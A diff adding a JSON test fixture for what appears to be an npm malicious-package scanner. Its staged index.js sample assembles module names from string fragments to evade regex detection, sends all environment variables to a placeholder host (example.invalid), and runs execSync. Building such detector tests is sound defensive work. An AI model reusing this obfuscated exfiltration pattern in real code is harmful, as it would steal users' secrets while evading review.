@@ -1,0 +1,38 @@
+{
+  "id": "npm-assembled-require-exfil",
+  "title": "Exfil via runtime-assembled identifiers evades the literal regex set",
+  "ecosystem": "npm",
+  "verdict": "malicious",
+  "threatClass": "obfuscated-dropper",
+  "source": "synthetic-adversarial",
+  "intent": "The payload assembles 'child_process', 'https', 'require', 'process', and 'env' from array fragments at runtime, so no contiguous string literal or member-access expression matches the deterministic regex set. This is a KNOWN MISS: it demonstrates the regex evasion gap and is the acceptance case for an AST/tokenizer-based detector. Safe: the endpoint is example.invalid and no real secret is present.",
+  "expectMinRisk": "high",
+  "expectAnyRule": [],
+  "previousPackageJson": { "name": "assembled-exfil", "version": "1.0.0" },
+  "stagedPackageJson": { "name": "assembled-exfil", "version": "1.0.1" },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 45,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"assembled-exfil\",\"version\":\"1.0.0\"}"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 45,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"assembled-exfil\",\"version\":\"1.0.1\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 360,
+      "sha256": "index-js",
+      "flags": [],
+      "textSample": "const p = ['chi','ld_pro','cess'].join('');\nconst n = ['htt','ps'].join('');\nconst e = ['en','v'].join('');\nconst r = globalThis['re' + 'quire'];\nconst cp = r(p);\nconst net = r(n);\nconst data = globalThis['proc' + 'ess'][e];\nnet['req' + 'uest']('https://example.invalid/c')['en' + 'd'](JSON.stringify(data));\ncp['exec' + 'Sync']('echo go');\n"
+    }
+  ]
+}
